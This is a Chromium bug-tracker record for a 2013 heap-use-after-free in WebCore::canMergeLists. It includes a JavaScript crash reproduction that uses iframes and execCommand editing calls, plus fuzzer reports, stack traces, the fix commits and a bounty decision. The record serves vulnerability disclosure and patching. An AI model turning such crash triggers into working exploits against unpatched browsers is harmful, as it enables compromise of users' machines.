# Heap-use-after-free in WebCore::canMergeLists

| Field | Value |
|-------|-------|
| **Issue ID** | [40078122](https://issues.chromium.org/issues/40078122) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Editing |
| **Reporter** | cl...@gmail.com |
| **Assignee** | yo...@chromium.org |
| **Created** | 2013-09-18 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes chromes ASAN build.

**VERSION**  

Chrome Version: asan-symbolized-linux-release-223354  

Operating System: Linux 64bit

**REPRODUCTION CASE**

<script>
function start() {
o0=tmp = document.createElement('iframe');;
document.getElementById('store\_div').appendChild(tmp);
o1=tmp = document.createElement('iframe');;
tmp.setAttribute('seamless', '');
document.getElementById('store\_div').appendChild(tmp);
window.setTimeout('startrly()', 100);
}
var c=0;
function startrly() {
o24=o0.parentNode;
o71=o0.cloneNode(false);
window.cb\_scriptsrc\_69\_count=0;
window.conce\_68=function() {if(c++==5) cb\_scriptsrc\_69\_1(); else return null;};
o71.src='javascript:window.top.conce\_68();';
document.body.appendChild(o71);
document.body.appendChild(o24);
document.designMode='on';
document.execCommand('selectall',false,null);
document.execCommand('fontname',false,'arial');
document.execCommand('insertunorderedlist',false,null);
document.execCommand('italic',false,false);
document.execCommand('undo',false,null);
document.execCommand('indent',false,null);
}
function cb\_scriptsrc\_69\_1() {
document.execCommand('insertunorderedlist',false,null);
document.execCommand('justifycenter',false,null);
}
</script>
<body onload="start()">
<h1>test</h1>
<div id="store\_div"></div>
</body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: see attached stack.txt for ASAN output

## Attachments

- [stack.txt](attachments/stack.txt) (text/plain; charset=us-ascii, 16.5 KB)

## Timeline

### cl...@chromium.org (2013-09-19)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=6198607732539392

### in...@chromium.org (2013-09-19)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-19)

Fixing impact labels.

### cl...@chromium.org (2013-09-19)

ClusterFuzz thinks that this bug might be eligible for a reward! Forwarding to reward panel for consideration.

### cl...@chromium.org (2013-09-19)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6198607732539392

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60e00004a5b4
Crash State:
  - crash stack -
  WebCore::canMergeLists
  WebCore::IndentOutdentCommand::tryIndentingAsListItem
  - free stack -
  WebCore::RemoveNodeCommand::~RemoveNodeCommand
  WebCore::CompositeEditCommand::~CompositeEditCommand
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=134892:134896

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97ATgZAHN3Isto-ANkOdLuedTYBSOEUjaTOCRf9Q1A4IJJ8pSR5sihLMZbh4smViWdUyepY1_aqTo239B0DPXObkWx6Hi3SaTEopBrs0UhTLvnXJyJARDhnJ0nPTJjsPFc6YGgeSMbo6xm6O6vL2ciYTh_1bA



### cl...@chromium.org (2013-09-23)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5159182697234432

Fuzzer: Bj_doc_fuzzer
Job Type: Linux_asan_content_shell_drt

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x6080000a3db4
Crash State:
  - crash stack -
  WebCore::canMergeLists
  WebCore::IndentOutdentCommand::tryIndentingAsListItem
  - free stack -
  WebCore::RemoveNodeCommand::~RemoveNodeCommand
  WebCore::EditCommandComposition::~EditCommandComposition
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=216775:216909

Minimized Testcase (0.86 Kb): https://cluster-fuzz.appspot.com/download/AMIfv97yXMpNzeiyeapKCsRrW42CDvcYhbieVx1Vm92YFX9wBoSXKhCXrLnkK4VNfXJRl6K91snhnJPptdQot6ALp5_IHAsuCEOMmRvnzlhZjBB6qnPKfIjwMBXJw5h1Hkp2HC-V3t6pLs8KN3cQiqWOm64m72fQCg



### jw...@chromium.org (2013-09-25)

When I run the minimized test case single-process content_shell Debug, I'm reaching the ASSERT_NOT_REACHED at line 151 of ApplyBlockElementCommand.cpp.

Elliott, it looks like you've played around in that file relatively recently, would you mind taking a look?

### in...@chromium.org (2013-09-25)

Did you saw our new criteria for possibly issuing higher rewards? See http://www.chromium.org/Home/chromium-security/vulnerability-rewards-program/reward-nomination-process
E.g. If you are able to provide a repro that faulted at an address of 0x41414141, it will qualify for the new higher rewards. Or, if you can show that you have control between free and crash points, etc.

### aa...@google.com (2013-09-30)

This looks to be in editing code, assigning to yosin@.

### cl...@chromium.org (2013-10-01)

Fixing milestone and impact labels.

### yo...@chromium.org (2013-10-02)

[Comment Deleted]

### yo...@chromium.org (2013-10-02)

I could re-produce with minimized test case and get ASSERT_NOT_REACHED in ApplyBlockElementCommand::formatSelection().

The command is "indent".

void ApplyBlockElementCommand::formatSelection(const VisiblePosition& startOfSelection, const VisiblePosition& endOfSelection)
{
...
        if (endOfNextParagraph.isNotNull() && !endOfNextParagraph.deepEquivalent().inDocument()) {
            ASSERT_NOT_REACHED();
            return;
        }
        endOfCurrentParagraph = endOfNextParagraph;
    }
}

# Stack Trace:
webkit.dll!WebCore::ApplyBlockElementCommand::formatSelection(const WebCore::VisiblePosition & startOfSelection, const WebCore::VisiblePosition & endOfSelection) Line 151	C++
webkit.dll!WebCore::IndentOutdentCommand::formatSelection(const WebCore::VisiblePosition & startOfSelection, const WebCore::VisiblePosition & endOfSelection) Line 224	C++
webkit.dll!WebCore::ApplyBlockElementCommand::doApply() Line 89	C++
webkit.dll!WebCore::CompositeEditCommand::apply() Line 184	C++
webkit.dll!WebCore::executeIndent(WebCore::Frame & frame, WebCore::Event * __formal, WebCore::EditorCommandSource __formal, const WTF::String & __formal) Line 486	C++
webkit.dll!WebCore::Editor::Command::execute(const WTF::String & parameter, WebCore::Event * triggeringEvent) Line 1700	C++
webkit.dll!WebCore::Document::execCommand(const WTF::String & commandName, bool userInterface, const WTF::String & value) Line 4171	C++
webkit.dll!WebCore::DocumentV8Internal::execCommandMethod(const v8::FunctionCallbackInfo<v8::Value> & args) Line 3915	C++
webkit.dll!WebCore::DocumentV8Internal::execCommandMethodCallback(const v8::FunctionCallbackInfo<v8::Value> & args) Line 3922	C++
v8.dll!v8::internal::FunctionCallbackArguments::Call(void (const v8::FunctionCallbackInfo<v8::Value> &) * f) Line 57	C++
v8.dll!v8::internal::HandleApiCallHelper<0>(v8::internal::`anonymous-namespace'::BuiltinArguments<1> args, v8::internal::Isolate * isolate) Line 1200	C++
1e90a116()	Unknown
[Frames below may be incorrect and/or missing]	
1e93bdf2()	Unknown
1e93bb24()	Unknown
1e92eff9()	Unknown
1e919a6a()	Unknown
v8.dll!v8::internal::Invoke(bool is_construct, v8::internal::Handle<v8::internal::JSFunction> function, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * args, bool * has_pending_exception) Line 120	C++
v8.dll!v8::internal::Execution::Call(v8::internal::Isolate * isolate, v8::internal::Handle<v8::internal::Object> callable, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * argv, bool * pending_exception, bool convert_receiver) Line 183	C++
v8.dll!v8::Script::Run() Line 1819	C++
webkit.dll!WebCore::V8ScriptRunner::runCompiledScript(v8::Handle<v8::Script> script, WebCore::ScriptExecutionContext * context, v8::Isolate * isolate) Line 97	C++
webkit.dll!WebCore::ScriptController::executeScriptAndReturnValue(v8::Handle<v8::Context> context, const WebCore::ScriptSourceCode & source, WebCore::AccessControlStatus corsStatus) Line 221	C++
webkit.dll!WebCore::ScheduledAction::execute(WebCore::Frame * frame) Line 102	C++
webkit.dll!WebCore::ScheduledAction::execute(WebCore::ScriptExecutionContext * context) Line 81	C++
webkit.dll!WebCore::DOMTimer::fired() Line 146	C++
webkit.dll!WebCore::ThreadTimers::sharedTimerFiredInternal() Line 134	C++
webkit.dll!WebCore::ThreadTimers::sharedTimerFired() Line 110	C++
glue_child.dll!webkit_glue::WebKitPlatformSupportImpl::DoTimeout() Line 137	C++
glue_child.dll!base::internal::RunnableAdapter<void (__thiscall webkit_glue::WebKitPlatformSupportImpl::*)(void)>::Run(webkit_glue::WebKitPlatformSupportImpl * object) Line 134	C++
glue_child.dll!base::internal::InvokeHelper<0,void,base::internal::RunnableAdapter<void (__thiscall webkit_glue::WebKitPlatformSupportImpl::*)(void)>,void __cdecl(webkit_glue::WebKitPlatformSupportImpl *)>::MakeItSo(base::internal::RunnableAdapter<void (__thiscall webkit_glue::WebKitPlatformSupportImpl::*)(void)> runnable, webkit_glue::WebKitPlatformSupportImpl * a1) Line 872	C++
glue_child.dll!base::internal::Invoker<1,base::internal::BindState<base::internal::RunnableAdapter<void (__thiscall webkit_glue::WebKitPlatformSupportImpl::*)(void)>,void __cdecl(webkit_glue::WebKitPlatformSupportImpl *),void __cdecl(base::internal::UnretainedWrapper<webkit_glue::WebKitPlatformSupportImpl>)>,void __cdecl(webkit_glue::WebKitPlatformSupportImpl *)>::Run(base::internal::BindStateBase * base) Line 1169	C++
base.dll!base::Callback<void __cdecl(void)>::Run() Line 396	C++
base.dll!base::Timer::RunScheduledTask() Line 187	C++
base.dll!base::BaseTimerTaskInternal::Run() Line 50	C++
base.dll!base::internal::RunnableAdapter<void (__thiscall base::BaseTimerTaskInternal::*)(void)>::Run(base::BaseTimerTaskInternal * object) Line 134	C++
base.dll!base::internal::InvokeHelper<0,void,base::internal::RunnableAdapter<void (__thiscall base::BaseTimerTaskInternal::*)(void)>,void __cdecl(base::BaseTimerTaskInternal *)>::MakeItSo(base::internal::RunnableAdapter<void (__thiscall base::BaseTimerTaskInternal::*)(void)> runnable, base::BaseTimerTaskInternal * a1) Line 872	C++
base.dll!base::internal::Invoker<1,base::internal::BindState<base::internal::RunnableAdapter<void (__thiscall base::BaseTimerTaskInternal::*)(void)>,void __cdecl(base::BaseTimerTaskInternal *),void __cdecl(base::internal::OwnedWrapper<base::BaseTimerTaskInternal>)>,void __cdecl(base::BaseTimerTaskInternal *)>::Run(base::internal::BindStateBase * base) Line 1169	C++
base.dll!base::Callback<void __cdecl(void)>::Run() Line 396	C++
base.dll!base::MessageLoop::RunTask(const base::PendingTask & pending_task) Line 493	C++
base.dll!base::MessageLoop::DeferOrRunPendingTask(const base::PendingTask & pending_task) Line 506	C++
base.dll!base::MessageLoop::DoDelayedWork(base::TimeTicks * next_delayed_work_time) Line 655	C++
base.dll!base::MessagePumpForUI::DoRunLoop() Line 248	C++
base.dll!base::MessagePumpWin::RunWithDispatcher(base::MessagePump::Delegate * delegate, base::MessagePumpDispatcher * dispatcher) Line 65	C++
base.dll!base::MessagePumpWin::Run(base::MessagePump::Delegate * delegate) Line 48	C++
base.dll!base::MessageLoop::RunInternal() Line 441	C++
base.dll!base::MessageLoop::RunHandler() Line 414	C++
base.dll!base::RunLoop::Run() Line 48	C++
base.dll!base::MessageLoop::Run() Line 312	C++
base.dll!base::Thread::Run(base::MessageLoop * message_loop) Line 159	C++
base.dll!base::Thread::ThreadMain() Line 205	C++
base.dll!base::`anonymous namespace'::ThreadFunc(void * params) Line 74	C++
kernel32.dll!7510336a()	Unknown
ntdll.dll!77039f72()	Unknown
ntdll.dll!77039f45()	Unknown


### yo...@chromium.org (2013-10-02)

Removing assertion in review: https://codereview.chromium.org/25657004/

### bu...@chromium.org (2013-10-02)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=158701

------------------------------------------------------------------------
r158701 | yosin@chromium.org | 2013-10-02T08:33:22.027458Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/editing/ApplyBlockElementCommand.cpp?r1=158701&r2=158700&pathrev=158701

Remove false assertion in ApplyBlockElementCommand::formatSelection()

Note: This patch is preparation of fixing https://crbug.com/chromium/294456.

This patch removes false assertion in ApplyBlockElementCommand::formatSelection(), when contents of being indent is modified, e.g. mutation event, |endOfNextParagraph| can hold removed contents.

BUG=294456
TEST=n/a
R=tkent@chromium.org

Review URL: https://codereview.chromium.org/25657004
------------------------------------------------------------------------

### yo...@chromium.org (2013-10-02)

The patch to fix this issue is in review: https://codereview.chromium.org/25691002/

### aa...@google.com (2013-10-02)

https://src.chromium.org/viewvc/blink?view=rev&revision=158727

### bu...@chromium.org (2013-10-02)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=158727

------------------------------------------------------------------------
r158727 | yosin@chromium.org | 2013-10-02T15:30:12.373505Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/editing/IndentOutdentCommand.cpp?r1=158727&r2=158726&pathrev=158727

Protect DOM nodes in IndentOutdentCommand::tryIndentingAsListItem()

This patch changes IndentOutdentCommand::tryIndentingAsListItem() to use RefPtr<T> instead of raw pointer for Node and Element not to remove during insertNodeBefore() and moveParagraphWIthClones() calls, which can execute user script to remove DOM nodes.

Note: When I tried to run a test case created by cluster fuzz, content_shell doesn't fail. It is hard to create a test case by hand.

BUG=294456
TEST=ClusterFuzz

Review URL: https://codereview.chromium.org/25691002
------------------------------------------------------------------------

### cl...@chromium.org (2013-10-03)

ClusterFuzz has detected this issue as fixed in range 226545:226626.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5159182697234432

Fuzzer: Bj_doc_fuzzer
Job Type: Linux_asan_content_shell_drt

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x6080000a3db4
Crash State:
  - crash stack -
  WebCore::canMergeLists
  WebCore::IndentOutdentCommand::tryIndentingAsListItem
  - free stack -
  WebCore::RemoveNodeCommand::~RemoveNodeCommand
  WebCore::EditCommandComposition::~EditCommandComposition
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=216775:216909
Fixed: https://cluster-fuzz.appspot.com/revisions?range=226545:226626

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97yXMpNzeiyeapKCsRrW42CDvcYhbieVx1Vm92YFX9wBoSXKhCXrLnkK4VNfXJRl6K91snhnJPptdQot6ALp5_IHAsuCEOMmRvnzlhZjBB6qnPKfIjwMBXJw5h1Hkp2HC-V3t6pLs8KN3cQiqWOm64m72fQCg

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### cl...@chromium.org (2013-10-04)

ClusterFuzz has detected this issue as fixed in range 226545:226626.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6198607732539392

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60e00004a5b4
Crash State:
  - crash stack -
  WebCore::canMergeLists
  WebCore::IndentOutdentCommand::tryIndentingAsListItem
  - free stack -
  WebCore::RemoveNodeCommand::~RemoveNodeCommand
  WebCore::CompositeEditCommand::~CompositeEditCommand
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=134892:134896
Fixed: https://cluster-fuzz.appspot.com/revisions?range=226545:226626

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97ATgZAHN3Isto-ANkOdLuedTYBSOEUjaTOCRf9Q1A4IJJ8pSR5sihLMZbh4smViWdUyepY1_aqTo239B0DPXObkWx6Hi3SaTEopBrs0UhTLvnXJyJARDhnJ0nPTJjsPFc6YGgeSMbo6xm6O6vL2ciYTh_1bA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### ka...@google.com (2013-10-04)

pls merge to M30 - branch 1599 and then switch mstone to 31 and re-request merge. ty.

### yo...@chromium.org (2013-10-07)

Merged into M30.
https://src.chromium.org/viewvc/blink?view=rev&revision=159001

Could you approve to merge this patch into M31?
Thanks in advance.

### la...@google.com (2013-10-07)

[Empty comment from Monorail migration]

### yo...@chromium.org (2013-10-08)

Merged into M31 (1650):
https://src.chromium.org/viewvc/blink?view=revision&revision=159073

### bu...@chromium.org (2013-10-08)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=159001

------------------------------------------------------------------------
r159001 | yosin@chromium.org | 2013-10-07T02:09:19.774437Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1599/Source/core/editing/IndentOutdentCommand.cpp?r1=159001&r2=159000&pathrev=159001

Merge 158727 "Protect DOM nodes in IndentOutdentCommand::tryInde..."

> Protect DOM nodes in IndentOutdentCommand::tryIndentingAsListItem()
> 
> This patch changes IndentOutdentCommand::tryIndentingAsListItem() to use RefPtr<T> instead of raw pointer for Node and Element not to remove during insertNodeBefore() and moveParagraphWIthClones() calls, which can execute user script to remove DOM nodes.
> 
> Note: When I tried to run a test case created by cluster fuzz, content_shell doesn't fail. It is hard to create a test case by hand.
> 
> BUG=294456
> TEST=ClusterFuzz
> 
> Review URL: https://codereview.chromium.org/25691002

TBR=yosin@chromium.org

Review URL: https://codereview.chromium.org/26203002
------------------------------------------------------------------------

### bu...@chromium.org (2013-10-08)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=159073

------------------------------------------------------------------------
r159073 | yosin@chromium.org | 2013-10-08T02:00:12.879414Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/1650/Source/core/editing/IndentOutdentCommand.cpp?r1=159073&r2=159072&pathrev=159073

Merge 158727 "Protect DOM nodes in IndentOutdentCommand::tryInde..."

> Protect DOM nodes in IndentOutdentCommand::tryIndentingAsListItem()
> 
> This patch changes IndentOutdentCommand::tryIndentingAsListItem() to use RefPtr<T> instead of raw pointer for Node and Element not to remove during insertNodeBefore() and moveParagraphWIthClones() calls, which can execute user script to remove DOM nodes.
> 
> Note: When I tried to run a test case created by cluster fuzz, content_shell doesn't fail. It is hard to create a test case by hand.
> 
> BUG=294456
> TEST=ClusterFuzz
> 
> Review URL: https://codereview.chromium.org/25691002

TBR=yosin@chromium.org

Review URL: https://codereview.chromium.org/26418004
------------------------------------------------------------------------

### mb...@google.com (2013-10-09)

[Empty comment from Monorail migration]

### mb...@chromium.org (2013-10-12)

$2000 since there is control between the free and use, but this is in the node heap partition.

### pa...@chromium.org (2013-10-18)

OK, kicked off payment for this one (and the rest). Expect something in a few weeks. Thanks again cloudfuzzer :)

### in...@chromium.org (2013-10-21)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-10-21)

Sorry wrong label added.

### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/294456?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078122)*
